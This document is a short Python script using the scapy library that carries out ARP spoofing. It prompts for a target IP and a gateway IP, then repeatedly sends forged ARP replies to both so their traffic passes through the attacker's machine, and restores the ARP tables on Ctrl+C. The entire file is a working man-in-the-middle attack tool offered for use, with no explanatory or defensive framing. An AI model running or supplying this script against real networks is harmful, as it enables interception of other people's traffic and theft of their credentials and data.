import scapy.all as scapy
import time

def mac(ipadd):
    arp_request = scapy.ARP(pdst=ipadd)
    br = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_br = br / arp_request
    list_1 = scapy.srp(arp_req_br, timeout=5, verbose=False)[0]
    return list_1[0][1].hwsrc


def spoof(targ, spoof):
    packet = scapy.ARP(op=2, pdst=targ, hwdst=mac(targ),
                       psrc=spoof)
    scapy.send(packet, verbose=False)


def reset(dest_ip, src_ip):
    dest_mac = mac(dest_ip)
    source_mac = mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


target_ip = input("[*] Enter Target IP > ")  # Enter your target IP
gateway_ip = input("[*] Enter Gateway IP > ")  # Enter your gateway's IP

try:
    countpackets = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        countpackets = countpackets + 2
        print("\r[*] Packets Sent " + str(countpackets), end="")
        time.sleep(2)  # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed............. Quitting. ")
    reset(gateway_ip, target_ip)
    reset(target_ip, gateway_ip)
    print("[*] Arp Spoof Stopped, IP restored. ")
